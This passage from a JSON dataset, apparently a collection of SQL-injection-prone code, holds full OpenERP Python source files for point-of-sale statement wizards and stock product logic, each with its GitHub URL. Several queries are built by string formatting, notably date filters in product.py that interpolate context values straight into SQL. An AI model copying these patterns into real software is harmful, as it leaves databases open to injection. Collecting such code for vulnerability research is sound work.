#        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/gisce/openobject-addons/blob/979db90c43ba0050400b0a5c8ad5da7ecc2bd76f",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if statemt_id.ending_details_ids:\n    #                        for i in statemt_id.ending_details_ids:\n    #                            c = statement_obj.create(cr, uid, {\n    #                                'pieces': i.pieces,\n    #                                'number': i.number,\n    #                                'starting_id': statement_id,\n    #                            })\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n\n        return {\n#           'domain': \"[('id','in', [\"+','.join(map(str,list_statement))+\"])]\",\n            'domain': \"[('state','=','open')]\",\n            'name': 'Open Statement',\n            'view_type': 'form',\n            'view_mode': 'tree,form',\n            'res_model': 'account.bank.statement',\n            'views': [(id2, 'tree'),(id3, 'form')],\n            'type': 'ir.actions.act_window'\n}\npos_open_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/gisce/openobject-addons/blob/4ef053f7e9c6e83304380912ce0ada5f2627ee08",
        "file_path": "/stock/product.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import fields, osv\nfrom tools.translate import _\n\nclass product_product(osv.osv):\n    _inherit = \"product.product\"\n\n    def get_product_accounts(self, cr, uid, product_id, context=None):\n        \"\"\" To get the stock input account, stock output account and stock journal related to product.\n        @param product_id: product id\n        @return: dictionary which contains information regarding stock input account, stock output account and stock journal\n        \"\"\"\n        if context is None:\n            context = {}\n        product_obj = self.pool.get('product.product').browse(cr, uid, product_id, context=context)\n\n        stock_input_acc = product_obj.property_stock_account_input and product_obj.property_stock_account_input.id or False\n        if not stock_input_acc:\n            stock_input_acc = product_obj.categ_id.property_stock_account_input_categ and product_obj.categ_id.property_stock_account_input_categ.id or False\n\n        stock_output_acc = product_obj.property_stock_account_output and product_obj.property_stock_account_output.id or False\n        if not stock_output_acc:\n            stock_output_acc = product_obj.categ_id.property_stock_account_output_categ and product_obj.categ_id.property_stock_account_output_categ.id or False\n\n        journal_id = product_obj.categ_id.property_stock_journal and product_obj.categ_id.property_stock_journal.id or False\n        account_variation = product_obj.categ_id.property_stock_variation and product_obj.categ_id.property_stock_variation.id or False\n\n        return {\n            'stock_account_input': stock_input_acc,\n            'stock_account_output': stock_output_acc,\n            'stock_journal': journal_id,\n            'property_stock_variation': account_variation\n        }\n\n    def do_change_standard_price(self, cr, uid, ids, datas, context={}):\n        \"\"\" Changes the Standard Price of Product and creates an account move accordingly.\n        @param datas : dict. contain default datas like new_price, stock_output_account, stock_input_account, stock_journal\n        @param context: A standard dictionary\n        @return:\n\n        \"\"\"\n        location_obj = self.pool.get('stock.location')\n        move_obj = self.pool.get('account.move')\n        move_line_obj = self.pool.get('account.move.line')\n\n        new_price = datas.get('new_price', 0.0)\n        stock_output_acc = datas.get('stock_output_account', False)\n        stock_input_acc = datas.get('stock_input_account', False)\n        journal_id = datas.get('stock_journal', False)\n        product_obj=self.browse(cr,uid,ids)[0]\n        account_variation = product_obj.categ_id.property_stock_variation\n        account_variation_id = account_variation and account_variation.id or False\n        if not account_variation_id: raise osv.except_osv(_('Error!'), _('Variation Account is not specified for Product Category: %s' % (product_obj.categ_id.name)))\n        move_ids = []\n        loc_ids = location_obj.search(cr, uid,[('usage','=','internal')])\n        for rec_id in ids:\n            for location in location_obj.browse(cr, uid, loc_ids):\n                c = context.copy()\n                c.update({\n                    'location': location.id,\n                    'compute_child': False\n                })\n\n                product = self.browse(cr, uid, rec_id, context=c)\n                qty = product.qty_available\n                diff = product.standard_price - new_price\n                if not diff: raise osv.except_osv(_('Error!'), _(\"Could not find any difference between standard price and new price!\"))\n                if qty:\n                    company_id = location.company_id and location.company_id.id or False\n                    if not company_id: raise osv.except_osv(_('Error!'), _('Company is not specified in Location'))\n                    #\n                    # Accounting Entries\n                    #\n                    if not journal_id:\n                        journal_id = product.categ_id.property_stock_journal and product.categ_id.property_stock_journal.id or False\n                    if not journal_id:\n                        raise osv.except_osv(_('Error!'),\n                            _('There is no journal defined '\\\n                                'on the product category: \"%s\" (id: %d)') % \\\n                                (product.categ_id.name,\n                                    product.categ_id.id,))\n                    move_id = move_obj.create(cr, uid, {\n                                'journal_id': journal_id,\n                                'company_id': company_id\n                                })\n\n                    move_ids.append(move_id)\n\n\n                    if diff > 0:\n                        if not stock_input_acc:\n                            stock_input_acc = product.product_tmpl_id.\\\n                                property_stock_account_input.id\n                        if not stock_input_acc:\n                            stock_input_acc = product.categ_id.\\\n                                    property_stock_account_input_categ.id\n                        if not stock_input_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock input account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * diff\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.name,\n                                    'account_id': stock_input_acc,\n                                    'debit': amount_diff,\n                                    'move_id': move_id,\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                    'name': product.categ_id.name,\n                                    'account_id': account_variation_id,\n                                    'credit': amount_diff,\n                                    'move_id': move_id\n                                    })\n                    elif diff < 0:\n                        if not stock_output_acc:\n                            stock_output_acc = product.product_tmpl_id.\\\n                                property_stock_account_output.id\n                        if not stock_output_acc:\n                            stock_output_acc = product.categ_id.\\\n                                    property_stock_account_output_categ.id\n                        if not stock_output_acc:\n                            raise osv.except_osv(_('Error!'),\n                                    _('There is no stock output account defined ' \\\n                                            'for this product: \"%s\" (id: %d)') % \\\n                                            (product.name,\n                                                product.id,))\n                        amount_diff = qty * -diff\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.name,\n                                        'account_id': stock_output_acc,\n                                        'credit': amount_diff,\n                                        'move_id': move_id\n                                    })\n                        move_line_obj.create(cr, uid, {\n                                        'name': product.categ_id.name,\n                                        'account_id': account_variation_id,\n                                        'debit': amount_diff,\n                                        'move_id': move_id\n                                    })\n\n            self.write(cr, uid, rec_id, {'standard_price': new_price})\n\n        return move_ids\n\n    def view_header_get(self, cr, user, view_id, view_type, context=None):\n        if context is None:\n            context = {}\n        res = super(product_product, self).view_header_get(cr, user, view_id, view_type, context)\n        if res: return res\n        if (context.get('active_id', False)) and (context.get('active_model') == 'stock.location'):\n            return _('Products: ')+self.pool.get('stock.location').browse(cr, user, context['active_id'], context).name\n        return res\n\n    def get_product_available(self, cr, uid, ids, context=None):\n        \"\"\" Finds whether product is available or not in particular warehouse.\n        @return: Dictionary of values\n        \"\"\"\n        if context is None:\n            context = {}\n        states = context.get('states',[])\n        what = context.get('what',())\n        if not ids:\n            ids = self.search(cr, uid, [])\n        res = {}.fromkeys(ids, 0.0)\n        if not ids:\n            return res\n\n        if context.get('shop', False):\n            cr.execute('select warehouse_id from sale_shop where id=%s', (int(context['shop']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['warehouse'] = res2[0]\n\n        if context.get('warehouse', False):\n            cr.execute('select lot_stock_id from stock_warehouse where id=%s', (int(context['warehouse']),))\n            res2 = cr.fetchone()\n            if res2:\n                context['location'] = res2[0]\n\n        if context.get('location', False):\n            if type(context['location']) == type(1):\n                location_ids = [context['location']]\n            elif type(context['location']) in (type(''), type(u'')):\n                location_ids = self.pool.get('stock.location').search(cr, uid, [('name','ilike',context['location'])], context=context)\n            else:\n                location_ids = context['location']\n        else:\n            location_ids = []\n            wids = self.pool.get('stock.warehouse').search(cr, uid, [], context=context)\n            for w in self.pool.get('stock.warehouse').browse(cr, uid, wids, context=context):\n                location_ids.append(w.lot_stock_id.id)\n\n        # build the list of ids of children of the location given by id\n        if context.get('compute_child',True):\n            child_location_ids = self.pool.get('stock.location').search(cr, uid, [('location_id', 'child_of', location_ids)])\n            location_ids = child_location_ids or location_ids\n        else:\n            location_ids = location_ids\n\n        uoms_o = {}\n        product2uom = {}\n        for product in self.browse(cr, uid, ids, context=context):\n            product2uom[product.id] = product.uom_id.id\n            uoms_o[product.uom_id.id] = product.uom_id\n\n        results = []\n        results2 = []\n\n        from_date=context.get('from_date',False)\n        to_date=context.get('to_date',False)\n        date_str=False\n        if from_date and to_date:\n            date_str=\"date_planned>='%s' and date_planned<='%s'\"%(from_date,to_date)\n        elif from_date:\n            date_str=\"date_planned>='%s'\"%(from_date)\n        elif to_date:\n            date_str=\"date_planned<='%s'\"%(to_date)\n\n        if 'in' in what:\n            # all moves from a location out of the set to a location in the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id NOT IN %s'\\\n                'and location_dest_id IN %s'\\\n                'and product_id IN %s'\\\n                'and state IN %s' + (date_str and 'and '+date_str+' ' or '') +''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results = cr.fetchall()\n        if 'out' in what:\n            # all moves from a location in the set to a location out of the set\n            cr.execute(\n                'select sum(product_qty), product_id, product_uom '\\\n                'from stock_move '\\\n                'where location_id IN %s'\\\n                'and location_dest_id NOT IN %s '\\\n                'and product_id  IN %s'\\\n                'and state in %s' + (date_str and 'and '+date_str+' ' or '') + ''\\\n                'group by product_id,product_uom',(tuple(location_ids),tuple(location_ids),tuple(ids),tuple(states),)\n            )\n            results2 = cr.fetchall()\n        uom_obj = self.pool.get('product.uom')\n        uoms = map(lambda x: x[2], results) + map(lambda x: x[2], results2)\n        if context.get('uom', False):\n            uoms += [context['uom']]\n\n        uoms = filter(lambda x: x not in uoms_o.keys(), uoms)\n        if uoms:\n            uoms = uom_obj.browse(cr, uid, list(set(uoms)), context=context)\n        for o in uoms:\n            uoms_o[o.id] = o\n        for amount, prod_id, prod_uom in results:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] += amount\n        for amount, prod_id, prod_uom in results2:\n            amount = uom_obj._compute_qty_obj(cr, uid, uoms_o[prod_uom], amount,\n                    uoms_o[context.get('uom', False) or product2uom[prod_id]])\n            res[prod_id] -= amount\n        return res\n\n    def _product_available(self, cr, uid, ids, field_names=None, arg=False, context=None):\n        \"\"\" Finds the incoming and outgoing quantity of product.\n        @return: Dictionary of values\n        \"\"\"\n        if not field_names:\n            field_names = []\n        if context is None:\n            context = {}\n        res = {}\n        for id in ids:\n            res[id] = {}.fromkeys(field_names, 0.0)\n        for f in field_names:\n            c = context.copy()\n            if f == 'qty_available':\n                c.update({ 'states': ('done',), 'what': ('in', 'out') })\n            if f == 'virtual_available':\n                c.update({ 'states': ('confirmed','waiting','assigned','done'), 'what': ('in', 'out') })\n            if f == 'incoming_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('in',) })\n            if f == 'outgoing_qty':\n                c.update({ 'states': ('confirmed','waiting','assigned'), 'what': ('out',) })\n            stock = self.get_product_available(cr, uid, ids, context=c)\n            for id in ids:\n                res[id][f] = stock.get(id, 0.0)\n        return res\n\n    _columns = {\n        'qty_available': fields.function(_product_available, method=True, type='float', string='Real Stock', help=\"Current quantities of products in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'virtual_available': fields.function(_product_available, method=True, type='float', string='Virtual Stock', help=\"Future stock for this product according to the selected locations or all internal if none have been selected. Computed as: Real Stock - Outgoing + Incoming.\", multi='qty_available'),\n        'incoming_qty': fields.function(_product_available, method=True, type='float', string='Incoming', help=\"Quantities of products that are planned to arrive in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'outgoing_qty': fields.function(_product_available, method=True, type='float', string='Outgoing', help=\"Quantities of products that are planned to leave in selected locations or all internal if none have been selected.\", multi='qty_available'),\n        'track_production': fields.boolean('Track Manufacturing Lots' , help=\"Forces to specify a Production Lot for all moves containing this product and generated by a Manufacturing Order\"),\n        'track_incoming': fields.boolean('Track Incoming Lots', help=\"Forces to specify a Production Lot for all moves containing this product and coming from a Supplier Location\"),\n        'track_outgoing': fields.boolean('Track Outgoing Lots', help=\"Forces to specify a Production Lot for all moves containing this product and going to a Customer Location\"),\n        'location_id': fields.dummy(string='Stock Location', relation='stock.location', type='many2one'),\n        'valuation':fields.selection([('manual_periodic', 'Periodical (manual)'),\n                                        ('real_time','Real Time (automated)'),], 'Inventory Valuation', \n                                        help=\"If real-time valuation is enabled for a product, the system will automatically write journal entries corresponding to stock moves.\" \\\n                                             \"The inventory variation account set on the product category will represent the current inventory value, and the stock input and stock output account will hold the counterpart moves for incoming and outgoing products.\"\n                                        , required=True),\n    }\n\n    _defaults = {\n        'valuation': lambda *a: 'manual_periodic',\n    }\n\n    def fields_view_get(self, cr, uid, view_id=None, view_type='form', context=None, toolbar=False, submenu=False):\n        res = super(product_product,self).fields_view_get(cr, uid, view_id, view_type, context, toolbar=toolbar, submenu=submenu)\n        if context is None:\n            context = {}\n        if ('location' in context) and context['location']:\n            location_info = self.pool.get('stock.location').browse(cr, uid, context['location'])\n            fields=res.get('fields',{})\n            if fields:\n                if location_info.usage == 'supplier':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Receptions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Received Qty')\n\n                if location_info.usage == 'internal':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Stock')\n\n                if location_info.usage == 'customer':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Deliveries')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Delivered Qty')\n\n                if location_info.usage == 'inventory':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future P&L')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('P&L Qty')\n\n                if location_info.usage == 'procurement':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Qty')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Unplanned Qty')\n\n                if location_info.usage == 'production':\n                    if fields.get('virtual_available'):\n                        res['fields']['virtual_available']['string'] = _('Future Productions')\n                    if fields.get('qty_available'):\n                        res['fields']['qty_available']['string'] = _('Produced Qty')\n        return res\n\nproduct_product()\n\nclass product_template(osv.osv):\n    _name = 'product.template'\n    _inherit = 'product.template'\n    _columns = {\n        'property_stock_procurement': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Procurement Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','procurement')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by procurements\"),\n        'property_stock_production': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Production Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','production')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated by production orders\"),\n        'property_stock_inventory': fields.property(\n            'stock.location',\n            type='many2one',\n            relation='stock.location',\n            string=\"Inventory Location\",\n            method=True,\n            view_load=True,\n            domain=[('usage','like','inventory')],\n            help=\"For the current product, this stock location will be used, instead of the default one, as the source location for stock moves generated when you do an inventory\"),\n        'property_stock_account_input': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n        'property_stock_account_output': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. If not set on the product, the one from the product category is used.'),\n    }\n\nproduct_template()\n\nclass product_category(osv.osv):\n\n    _inherit = 'product.category'\n    _columns = {\n        'property_stock_journal': fields.property('account.journal',\n            relation='account.journal', type='many2one',\n            string='Stock journal', method=True, view_load=True,\n            help=\"When doing real-time inventory valuation, this is the Accounting Journal in which entries will be automatically posted when stock moves are processed.\"),\n        'property_stock_account_input_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Input Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all incoming stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_account_output_categ': fields.property('account.account',\n            type='many2one', relation='account.account',\n            string='Stock Output Account', method=True, view_load=True,\n            help='When doing real-time inventory valuation, counterpart Journal Items for all outgoing stock moves will be posted in this account. This is the default value for all products in this category, it can also directly be set on each product.'),\n        'property_stock_variation': fields.property('account.account',\n            type='many2one',\n            relation='account.account',\n            string=\"Stock Variation Account\",\n            method=True, view_load=True,\n            help=\"When real-time inventory valuation is enabled on a product, this account will hold the current value of the products.\",),\n    }\n\nproduct_category()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zabertech/openerp-addons-6.1/blob/4ad703b1c353a8318094d79ca0dfea34e7f05e27",
        "file_path": "/point_of_sale/wizard/pos_close_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\n\nclass pos_close_statement(osv.osv_memory):\n    _name = 'pos.close.statement'\n    _description = 'Close Statements'\n\n    def close_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Close the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Dictionary\n        \"\"\"\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        statement_obj = self.pool.get('account.bank.statement')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if not ids:\n                raise osv.except_osv(_('Message'), _('Journals are already closed'))\n            else:\n                list_statement.append(ids[0])\n                if not journal.check_dtls:\n                    statement_obj.button_confirm_cash(cr, uid, ids, context)\n    #        if not list_statement:\n    #            return {}\n    #        model_data_ids = mod_obj.search(cr, uid,[('model','=','ir.ui.view'),('name','=','view_bank_statement_tree')], context=context)\n    #        resource_id = mod_obj.read(cr, uid, model_data_ids, fields=['res_id'], context=context)[0]['res_id']\n\n        data_obj = self.pool.get('ir.model.data')\n        id2 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_tree')\n        id3 = data_obj._get_id(cr, uid, 'account', 'view_bank_statement_form2')\n        if id2:\n            id2 = data_obj.browse(cr, uid, id2, context=context).res_id\n        if id3:\n            id3 = data_obj.browse(cr, uid, id3, context=context).res_id\n        return {\n                'domain': \"[('id','in',\" + str(list_statement) + \")]\",\n                'name': 'Close Statements',\n                'view_type': 'form',\n                'view_mode': 'tree,form',\n                'res_model': 'account.bank.statement',\n                'views': [(id2, 'tree'),(id3, 'form')],\n                'type': 'ir.actions.act_window'}\n\npos_close_statement()\n\n# vim:expandtab:smartindent:tabstop=4:softtabstop=4:shiftwidth=4:\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zabertech/openerp-addons-6.1/blob/4ad703b1c353a8318094d79ca0dfea34e7f05e27",
        "file_path": "/point_of_sale/wizard/pos_open_statement.py",
        "source": "# -*- coding: utf-8 -*-\n##############################################################################\n#\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as\n#    published by the Free Software Foundation, either version 3 of the\n#    License, or (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n##############################################################################\n\nfrom osv import osv\nfrom tools.translate import _\nimport time\n\nclass pos_open_statement(osv.osv_memory):\n    _name = 'pos.open.statement'\n    _description = 'Open Statements'\n\n    def open_statement(self, cr, uid, ids, context):\n        \"\"\"\n             Open the statements\n             @param self: The object pointer.\n             @param cr: A database cursor\n             @param uid: ID of the user currently logged in\n             @param context: A standard dictionary\n             @return : Blank Directory\n        \"\"\"\n        list_statement = []\n        mod_obj = self.pool.get('ir.model.data')\n        company_id = self.pool.get('res.users').browse(cr, uid, uid).company_id.id\n        statement_obj = self.pool.get('account.bank.statement')\n        sequence_obj = self.pool.get('ir.sequence')\n        journal_obj = self.pool.get('account.journal')\n        cr.execute(\"\"\"select DISTINCT journal_id from pos_journal_users where user_id=%d order by journal_id\"\"\"%(uid))\n        j_ids = map(lambda x1: x1[0], cr.fetchall())\n        cr.execute(\"\"\" select id from account_journal\n                            where auto_cash='True' and type='cash'\n                            and id in (%s)\"\"\" %(','.join(map(lambda x: \"'\" + str(x) + \"'\", j_ids))))\n        journal_ids = map(lambda x1: x1[0], cr.fetchall())\n\n        for journal in journal_obj.browse(cr, uid, journal_ids):\n            ids = statement_obj.search(cr, uid, [('state', '!=', 'confirm'), ('user_id', '=', uid), ('journal_id', '=', journal.id)])\n            if len(ids):\n                raise osv.except_osv(_('Message'), _('You can not open a Cashbox for \"%s\". \\n Please close the cashbox related to. ' %(journal.name)))\n            \n#            cr.execute(\"\"\" Select id from account_bank_statement\n#                                    where journal_id =%d\n#                                    and company_id =%d\n#                                    order by id desc limit 1\"\"\" %(journal.id, company_id))\n#            st_id = cr.fetchone()\n            \n            number = ''\n            if journal.sequence_id:\n                number = sequence_obj.get_id(cr, uid, journal.sequence_id.id)\n            else:\n                number = sequence_obj.get(cr, uid, 'account.bank.statement')\n            \n            statement_id = statement_obj.create(cr, uid, {'journal_id': journal.id,\n                                                          'company_id': company_id,\n                                                          'user_id': uid,\n                                                          'state': 'open',\n                                                          'name': number,\n                                                          'starting_details_ids': statement_obj._get_cash_close_box_lines(cr, uid, []),\n                                                      })\n            statement_obj.button_open(cr, uid, [statement_id], context)\n\n    #            period = statement_obj._get_period(cr, uid, context) or None\n    #            cr.execute(\"INSERT INTO account_bank_statement(journal_id,company_id,user_id,state,name, period_id,date) VALUES(%d,%d,%d,'open','%s',%d,'%s')\"%(journal.id, company_id, uid, number, period, time.strftime('%Y-%m-%d %H:%M:%S')))\n    #            cr.commit()\n    #            cr.execute(\"select id from account_bank_statement where journal_id=%d and company_id=%d and user_id=%d and state='open' and name='%s'\"%(journal.id, company_id, uid, number))\n    #            statement_id = cr.fetchone()[0]\n    #            print \"statement_id\",statement_id\n    #            if st_id:\n    #                statemt_id = statement_obj.browse(cr, uid, st_id[0])\n    #                list_statement.append(statemt_id.id)\n    #                if statemt_id and statemt_id.ending_details_ids:\n    #                    statement_obj.write(cr, uid, [statement_id], {\n    #                        'balance_start': statemt_id.balance_end,\n    #                        'state': 'open',\n    #                    })\n    #                    if 